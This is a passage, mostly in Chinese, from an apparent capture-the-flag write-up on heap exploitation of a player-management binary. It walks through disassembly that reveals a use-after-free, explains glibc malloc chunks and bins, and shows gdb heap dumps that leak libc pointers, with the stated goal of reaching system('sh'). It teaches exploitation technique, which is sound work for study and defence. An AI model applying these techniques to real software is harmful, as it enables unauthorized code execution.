    0x604220:    0x4444444444444444    0x4444444444444444
    0x604230:    0x4444444444444444    0x4444444444444444
    0x604240:    0x4444444444444444    0x4444444444444444
    0x604250:    0x4444444444444444    0x4444444444444444
    0x604260:    0x4444444444444444    0x4444444444444444
    0x604270:    0x4444444444444444    0x4444444444444444
    0x604280:    0x0000000000000000    0x0000000000020d81 :       0x0000000000604010    0x00000000006040a0
    0x603190 :    0x0000000000604130    0x00000000006041e0
很好，我们正式创建了一支球队。下面我们来 pwn 它！
**  
**
**UAF 漏洞**
堆有关于内存的分配和释放。如果一个被释放的内存没有被正确地管理，就可能发生信息泄露，甚至是任意代码执行。我们来看一下，在删除一个球员时，实际发生了什么。
     [...]
    /* index */
    00401b9c  mov     eax, dword [rbp-0x1c]
    /* player struct pointer */
    00401b9f  mov     rax, qword [rax*8+0x603180] 
    00401ba7  mov     qword [rbp-0x18], rax
    00401bab  mov     eax, dword [rbp-0x1c]
    /* Mitigate double-free, good shit */
    00401bae  mov     qword [rax*8+0x603180], 0x0 
    00401bba  mov     rax, qword [rbp-0x18]
    /* player's name pointer */
    00401bbe  mov     rax, qword [rax+0x10]      
    00401bc2  mov     rdi, rax
    00401bc5  call    free
    /* player's chunk */
    00401bca  mov     rax, qword [rbp-0x18]   
    00401bce  mov     rdi, rax
    00401bd1  call    free
                 [...]
首先被释放的是球员的名字，然后是球员本身的 chunk。回想一下，当我们想要 show 一个球员之前，必须先 select
它。但是，上面的汇编代码并不会将全局变量 selected 清零。这是一个重要的逻辑错误，它意味着即使球员已经被释放，我们仍然可以打印出球员的信息。
show 函数的工作：
    /* Global variable holding a player pointer */
                 [...]
    004020f2  mov     rax, qword [rel selected] 
    004020f9  mov     rdi, rax
    004020fc  call    show_player_func
                 [...]
正如你看到的，它接收变量 selected 的内容作为一个参数，而该参数是一个球员结构体的指针。
**  
**
**堆崩溃简介**
在现代操作系统中，ASLR 是（或应该是）被开启的。为了得到 shell，我们需要用 sh 作为参数来调用 system()。我们事先并不知道
system() 的地址，但可以先泄露某个 libc 函数的地址，帮助我们计算出 libc 的基址，然后根据偏移得到 system()
的地址。所有这一切，都要感谢 Use-After-Free 漏洞。
在开始之前，我们先回顾下关于 malloc 和 free 处理 chunk 知识。
Malloc 根据 chunk 大小的不同来管理它们。
    struct malloc_chunk {
      INTERNAL_SIZE_T      mchunk_prev_size;  /* Size of previous chunk (if free).  */
      INTERNAL_SIZE_T      mchunk_size;       /* Size in bytes, including overhead. */
      struct malloc_chunk* fd;                /* double links -- used only if free. */
      struct malloc_chunk* bk;
      /* Only used for large blocks: pointer to next larger size.  */
      struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */
      struct malloc_chunk* bk_nextsize;
    };
    malloc chunk
        chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
                |             Size of previous chunk, if unallocated (P clear)  |
                +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
                |             Size of chunk, in bytes                     |A|M|P|
          mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
                |             User data starts here...                          .
                .                                                               .
                .             (malloc_usable_size() bytes)                      .
                .                                                               |
    nextchunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
                |             (size of chunk, but used for application data)    |
                +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
                |             Size of next chunk, in bytes                |A|0|1|
                +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    free chunk
        chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
                |             Size of previous chunk, if unallocated (P clear)  |
                +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        `head:' |             Size of chunk, in bytes                     |A|0|P|
          mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
                |             Forward pointer to next chunk in list             |
                +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
                |             Back pointer to previous chunk in list            |
                +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
                |             Unused space (may be 0 bytes long)                .
                .                                                               .
                .                                                               |
    nextchunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
        `foot:' |             Size of chunk, in bytes                           |
                +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
                |             Size of next chunk, in bytes                |A|0|0|
                +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
有三种核心的 chunk 类型：
**Fast chunks – 表示小尺寸的 chunk**
**Small chunks – 表示尺寸不是那么小的 chunk**
**Large chunks – 表示尺寸相当庞大的 chunk**
当一个 chunk 被释放时，它被保存到一个列表里。该列表可能是单链表或循环双链表。但不是所有类型的 chunk
都被放在同一个列表中。基本上，就是那些被叫做 fast bin、small bin、unsorted bin 和 large bin 的 chunk。
**Fast bins：**
总共有 10 个 fast bin。这些 bins 中的每一个都维护着一个单链表。添加和删除操作发生在该列表的头部（LIFO）。两个相邻的空闲 fast
chunk 不会被合并在一起。
**Small bins：**
总共有 62 个 small bin。small bin 的速度比 large bin 要快，但比 fast bin 要慢。每一个 bin
维护一个双链表。插入操作发生在链表的头部，而删除操作发生在尾部（FIFO）。small chunk 如果以 unsorted bin
结尾，则可能被合并在一起。
**Large bins：**
总共有 63 个 large bin。每个 bin 维护着一个双链表。一个特定的 large bin 具有不同大小的 chunk，以递减顺序排列（即最大的
chunk 在头部而最小的 chunk 在尾部）。插入和删除操作可以发生在链表的任何地方。large chunk 如果以 unsorted bin
结尾，则可能被合并在一起。
**Unsorted bin：**
unsorted bin 只有一个。当 small chunk 和 large chunk 被释放时，以该 bin 作为结尾。该 bin
的主要作用是充当一个“缓冲层（cache layer）”，以加快内存分配和释放请求的速度。
**Top Chunk：**
它是作为一个 arena 上边界的 chunk。它是处理 malloc 请求时最后的操作。
**UAF 漏洞**
现在我们已经分配了 4 名球员，下面我们来泄露 libc 函数的地址。
    select(2)
    free(2)
    (gdb) x/80gx 0x604000
    0x604000:    0x0000000000000000    0x0000000000000021 <-- player 0 [in use]
    0x604010:    0x0000000200000001    0x0000000400000003
    0x604020:    0x0000000000604030    0x0000000000000071
    0x604030:    0x4141414141414141    0x4141414141414141
    0x604040:    0x4141414141414141    0x4141414141414141
    0x604050:    0x4141414141414141    0x4141414141414141
    0x604060:    0x4141414141414141    0x4141414141414141
    0x604070:    0x4141414141414141    0x4141414141414141
    0x604080:    0x4141414141414141    0x4141414141414141
    0x604090:    0x0000000000000000    0x0000000000000021 <-- player 1 [in use]
    0x6040a0:    0x0000000200000001    0x0000000400000003
    0x6040b0:    0x00000000006040c0    0x0000000000000071
    0x6040c0:    0x4242424242424242    0x4242424242424242
    0x6040d0:    0x4242424242424242    0x4242424242424242
    0x6040e0:    0x4242424242424242    0x4242424242424242
    0x6040f0:    0x4242424242424242    0x4242424242424242
    0x604100:    0x4242424242424242    0x4242424242424242
    0x604110:    0x4242424242424242    0x4242424242424242
    0x604120:    0x0000000000000000    0x0000000000000021 <-- player 2 [free]
    0x604130:    0x0000000000000000    0x0000000400000003
    0x604140:    0x0000000000604150    0x0000000000000091
    0x604150:    0x00007ffff7dd37b8    0x00007ffff7dd37b8 
    0x604160:    0x4343434343434343    0x4343434343434343
    0x604170:    0x4343434343434343    0x4343434343434343
    0x604180:    0x4343434343434343    0x4343434343434343
    0x604190:    0x4343434343434343    0x4343434343434343
    0x6041a0:    0x4343434343434343    0x4343434343434343
    0x6041b0:    0x4343434343434343    0x4343434343434343
    0x6041c0:    0x4343434343434343    0x4343434343434343
球员 2 被正式释放了，但它的名字指针依然指向相同的区域。我们把球员 2 的信息挑出来。
    0x604120:    0x0000000000000000    0x0000000000000021 <-- player 2 [free]
    0x604130:    0x0000000000000000    0x0000000400000003
    0x604140:    0x0000000000604150    0x0000000000000091
    0x604150:    0x00007ffff7dd37b8    0x00007ffff7dd37b8
    0x604160:    0x4343434343434343    0x4343434343434343
    0x604170:    0x4343434343434343    0x4343434343434343
    0x604180:    0x4343434343434343    0x4343434343434343
    0x604190:    0x4343434343434343    0x4343434343434343
    0x6041a0:    0x4343434343434343    0x4343434343434343
    0x6041b0:    0x4343434343434343    0x4343434343434343
    0x6041c0:    0x4343434343434343    0x4343434343434343
    0x6041d0:    0x0000000000000090    0x0000000000000020 <-- player 3 [in use]